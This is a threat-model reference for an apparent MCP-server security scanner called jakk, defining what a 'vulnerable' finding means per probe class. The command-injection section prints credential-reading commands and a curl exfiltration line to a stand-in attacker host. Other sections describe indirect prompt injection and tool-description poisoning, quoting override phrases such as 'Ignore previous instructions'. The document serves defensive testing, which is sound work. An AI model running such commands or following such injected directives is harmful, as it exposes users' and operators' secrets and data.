---
date: 2026-05-22
status: threat-model reference — what "vulnerable" means per probe class
scope: all 11 v0.2 probes
---

# What "vulnerable" actually means

jakk emits the same outcome label (`vulnerable`) for every probe that
fires. The *threat model* and *real-world harm* are different per
probe class. This document defines each class concretely — what an
attacker can do, who the attacker is, and who gets hurt.

## The contract

`vulnerable` means **we have evidence in the response that the
server's behavior diverges from the security property it should
hold**. It does NOT mean:

- An attacker is currently exploiting this (jakk doesn't observe in-the-wild use).
- The bug is necessarily severe (depends on who can reach the endpoint).
- The exploit chain ends here (real attacks may be worse than the one probe demonstrates).

It DOES mean:

- A human reviewer can take the JSONL output and reproduce the finding manually.
- The fix is in the server, not in jakk.
- The probe's `expected_signal` correctly classifies the bug class.

---

## `mcp.command.shell_marker` / `mcp.command.secret_file_read`

**Signal:** `input.command_injection` · **OWASP:** MCP05

### What "vulnerable" means
The server interpolates a tool argument into a shell command (or
equivalent: `subprocess.run(..., shell=True)`, `os.system`, an `eval`'d
template, a CLI wrapper without proper argument escaping).

### Concrete harm
Arbitrary code execution as the server process. The attacker can:

- Read any file the server can read: `cat /etc/passwd`, `cat ~/.ssh/id_rsa`, `cat /app/secrets/*`.
- Connect outbound: `curl attacker.com/exfil -d @/etc/shadow`.
- Plant a persistent backdoor (modify crontab, write a service unit, replace a binary on PATH).
- Pivot to adjacent services if the server has internal network access.

### Who's the attacker
For an MCP server, the "attacker" is *anything feeding the LLM
untrusted content*: an email body the agent reads, a GitHub issue,
a webpage, a Slack message, a calendar invite. Indirect prompt
injection in that content manipulates the LLM into calling the
vulnerable tool with attacker-chosen arguments.

The LLM is the gun. The malicious content is the trigger. The
vulnerable MCP tool is the bullet.

### Who's harmed
The server operator (compromised infrastructure), the LLM host
(their agent was weaponized), and the user (their data and
credentials).

---

## `mcp.path.prefix_bypass` / `mcp.path.canary_file_read`

**Signal:** `input.path_traversal` · **OWASP:** MCP04 / MCP02

### What "vulnerable" means
The server tries to gate file access to an allowlisted directory
using `startswith()` (the CVE-2025-53110 shape) — letting
`/safe/files_sensitive/...` through because it starts with
`/safe/files`. Or accepts `..` traversal that escapes the intended
scope.

### Concrete harm
The attacker reads files outside the intended scope:

- Adjacent customer / tenant data on a multi-tenant server.
- Server-side config files, environment files, deployment secrets.
- Source code, build artifacts, internal documentation.

### Who's the attacker
Same indirect-injection path: untrusted content tells the LLM to
read a path the server's naive check accepts.

### Who's harmed
Primarily the *other tenants* / customers whose data lives adjacent
to the intended allowlist. The server operator's own infrastructure
secrets are also at risk.

---

## `mcp.response.secret_overshare`

**Signal:** `response.secret_leak` · **OWASP:** MCP02 + MCP05

### What "vulnerable" means
A benign-looking tool (`list_repositories`, `get_status`,
`read_config`, `get_settings`) returns secret-shaped strings —
API keys, PEM blocks, passwords, tokens — in its response.

### Concrete harm
Any agent or operator who calls the tool gets secrets they shouldn't
have. Crucially:

- LLM transcripts are usually logged (Langfuse, Phoenix, CloudWatch). The secrets land there.
- If the LLM summarizes the response back to the user, the secrets travel further.
- If the LLM passes the response to another tool (e.g. "send this to my colleague"), the secrets leak outward.

### Who's the attacker
No active attacker required — this is a self-inflicted leak. The
"attack" is simply running the tool. But an attacker who has access
to downstream observability or to the user's chat history harvests
the secrets for free.

### Who's harmed
The server operator (their secrets exposed) and the user (their
credentials may be among the leaked values).

---

## `mcp.response.directive_passthrough`

**Signal:** `response.directive_passthrough` · **OWASP:** MCP03

### What "vulnerable" means
A tool's response contains content that *issues instructions to the
LLM* — `SYSTEM:`, `Ignore previous instructions`, `You are now…`,
`<SYSTEM>...</SYSTEM>`. The classic indirect-prompt-injection
vector: the response is untrusted text the LLM may follow.

### Concrete harm
The LLM is hijacked mid-task. The attacker can steer it to:

- Exfiltrate the user's data via outbound tools.
- Call destructive tools (delete files, send emails, transfer funds).
- Leak the system prompt and any embedded instructions.
- Ignore safety guardrails and return misleading output to the user.

### Who's the attacker
Whoever can plant content where the tool reads from — a malicious
notification, a calendar invite from an unknown sender, a public
GitHub issue, a webpage the agent visits, a WhatsApp message.

### Who's harmed
The user (their agent was hijacked) AND the operator (their tool
became an injection surface that they probably don't see).

---

## `mcp.schema.description_smuggling`

**Signal:** `schema.tool_poisoning` · **OWASP:** MCP01 + MCP03

### What "vulnerable" means
The server's `tools/list` response contains directives smuggled into
tool *descriptions* or *parameter descriptions* — `<SYSTEM>` blocks,
"ignore previous instructions" embedded in a parameter doc, etc.
The Invariant Labs tool-poisoning writeup pattern.

### Concrete harm
Before the LLM ever calls a tool, it ingests the descriptions during
tool-selection. Smuggled directives prime the LLM. This is *passive*
— happens just by connecting to the server.

### Who's the attacker
A third party who controls an MCP server the user added in good
faith. The smuggled instructions silently influence every
conversation with the user's LLM.

### Who's harmed
The user (their LLM is being steered without their knowledge) AND
the LLM host (guardrails bypassed at the protocol layer, below the
chat).

---

## `mcp.auth.no_credential` / `mcp.auth.invalid_token` / `mcp.auth.wrong_prefix`

**Signal:** `auth.anonymous_access` / `auth.token_not_validated` / `auth.scheme_not_enforced` · **OWASP:** MCP10

### What "vulnerable" means
The server accepts requests with no Authorization header, or with a
garbage Bearer token, or with a token sent without the `Bearer `
scheme prefix.

### Concrete harm
**Anonymous access to the entire tool surface.** Anyone who can
reach the endpoint can call every tool:

- If tools mutate data (create projects, send messages, transfer money), anyone can do that too.
- If tools read data, anyone can read it.
- If tools have side effects (run jobs, trigger deployments), anyone triggers them.

### Who's the attacker
Any internet host that can reach the endpoint, OR any internal
network host if the endpoint is private but the auth proxy is
broken.

### Who's harmed
Every customer / user whose data is behind the server. Server
operator catastrophically. If the server is a fronting proxy for a
real backend, the backend's auth is now effectively bypassed for
everyone who knew the endpoint URL.

### When this is NOT a finding
Some servers are intentionally public (read-only documentation,
capability-discovery endpoints, demo servers). For those, flip the
probe's `auth_override.expect_success: pass` in a local override or
exclude it via `--select` / `--owasp`. jakk doesn't infer intent —
it reports the property.

---

## `mcp.authz.cross_tenant_read`

**Signal:** `authz.cross_tenant_read` · **OWASP:** MCP08

### What "vulnerable" means
The server authenticates (validates that the credential is *valid*)
but doesn't authorize the specific resource (doesn't check that the
credential's identity *owns* the requested object). The classic
confused-deputy / BOLA (Broken Object-Level Authorization) bug.

### Concrete harm
Paying customers of a multi-tenant service can read each other's
data:

- Tenant A's contracts, customer lists, financial records.
- Tenant A's API keys if a `get_settings`-style tool returns them.
- Tenant A's documents, messages, calendars, employee data.

In the breach-to-fix ch01 demonstration, bravo's API key (a valid
`tenant_bravo` identity) reads `CRM-1001` (a `tenant_alpha`
project). In a production Asana / Slack / Linear analog, the same
shape would expose contracts, PII, and customer correspondence to a
different tenant.

### Who's the attacker
**Any paying customer of the service.** No exploitation required —
just call a normal tool with a different tenant's resource ID. IDs
are often predictable (sequential, low-entropy UUIDs, customer-name
slugs, project numbers).

### Who's harmed
Every other tenant. This is typically the highest-impact bug class
for B2B SaaS, often warranting public disclosure obligations
(GDPR, SOC2, customer breach notifications).

---

## When the probe is wrong

The threat models above assume the probe fires *correctly*. jakk has
known limitations where `vulnerable` may be inaccurate:

| Probe | False-positive shape |
|---|---|
| `mcp.command.shell_marker` | A tool that legitimately echoes input back without shelling out can fire `echo`, not `vulnerable`. Corroboration (v0.2 §4) catches this. |
| `mcp.response.secret_overshare` | A response that contains placeholder strings shaped like secrets (`password = "REPLACE_ME"`) — but no real secret. Operator must eyeball the evidence. |
| `mcp.response.directive_passthrough` | A blog post or tutorial discussing prompt injection contains `"Ignore previous instructions"` as quoted example text. Same — operator triage. |
| `mcp.auth.*` | An intentionally-public server returns tools without auth. True positive in the matcher's terms, but not actionable. Document via per-target override. |
| `mcp.authz.cross_tenant_read` | The matcher's regex is target-specific. A generic regex would over-fire. The provided pattern (`"tenant"\s*:\s*"tenant_alpha"`) only works on ch01-style servers; other targets need a custom matcher. |

Triage rule: every `vulnerable` finding deserves a human look at the
`evidence` and `payload` in the JSONL before being filed as a bug.
